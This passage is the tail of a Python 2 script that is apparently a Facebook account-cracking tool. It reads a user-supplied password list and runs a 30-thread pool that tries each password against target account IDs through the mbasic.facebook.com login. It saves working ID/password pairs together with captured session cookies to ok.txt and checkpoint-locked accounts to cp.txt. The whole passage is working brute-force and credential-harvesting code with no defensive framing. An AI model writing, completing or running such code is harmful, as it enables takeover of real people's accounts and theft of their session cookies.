                print '\n\x1b[0;36m   [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;97m Finished'
                print '\x1b[0;96m   [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m] \x1b[0;97mAccount [OK] Saved to : ok.txt\x1b[0;96m   [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m] \x1b[0;97mAccount [CP] Saved to : cp.txt'
                break

    def pwlist(self):
        self.pw = raw_input('  \x1b[0;96m [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m] \x1b[0;97mPassword List :\x1b[0;96m ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            print '\x1b[0;96m   [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;97m Crack Started...'
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            print '\n\x1b[0;36m   [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m]\x1b[0;97m Finished'
            print '\x1b[0;96m   [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m] \x1b[0;97mAccount [OK] Saved to : ok.txt\x1b[0;96m   [\x1b[0;97m\xe2\x80\xa2\x1b[0;96m] \x1b[0;97mAccount [CP] Saved to : cp.txt'

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = mbasic(fl.get('id'), i, 'https://mbasic.facebook.com')
                if log.get('status') == 'success':
                    print '\r\x1b[0;36m   [OK] %s | %s               ' % (fl.get('id'), i)
                    self.ada.append('%s|%s' % (fl.get('id'), i))
                    if fl.get('id') in open('ok.txt').read():
                        break
                    else:
                        open('ok.txt', 'a+').write('%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies'))))
                    ko = '%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies')))
                    break
                elif log.get('status') == 'cp':
                    print '\r\x1b[0;33m   [CP] %s | %s               ' % (fl.get('id'), i)
                    self.cp.append('%s|%s' % (fl.get('id'), i))
                    open('cp.txt', 'a+').write('%s|%s\n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.ko += 1
            print '\r\x1b[0;36m   [\x1b[0;97mCrack\x1b[0;96m] \x1b[0;97m%s/%s | OK : %s | CP : %s' % (self.ko, len(self.fl), len(self.ada), len(self.cp)),
            sys.stdout.flush()
        except:
            self.main(fl)


if __name__ == '__main__':
    menu()
